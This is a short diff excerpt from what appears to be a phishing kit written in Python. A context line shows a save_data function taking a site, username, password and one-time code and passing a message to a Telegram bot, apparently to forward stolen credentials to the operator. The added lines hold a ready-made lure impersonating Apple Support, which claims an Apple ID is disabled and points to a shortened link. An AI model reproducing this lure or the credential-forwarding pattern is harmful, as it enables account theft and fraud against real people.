@@ -47,9 +47,8 @@ async def save_data(site, username, password, otp):
     await bot.send_message(chat_id=your_user_id, text=message)
 
 
-http://tinyurl.com/5sk4w7nk
-
-
+#http://tinyurl.com/5sk4w7nk
+#This Apple ID has been disabled for security reasons , Just click on link to reset your password http://tinyurl.com/5sk4w7nk Apple Support team
 
 
 def logo():
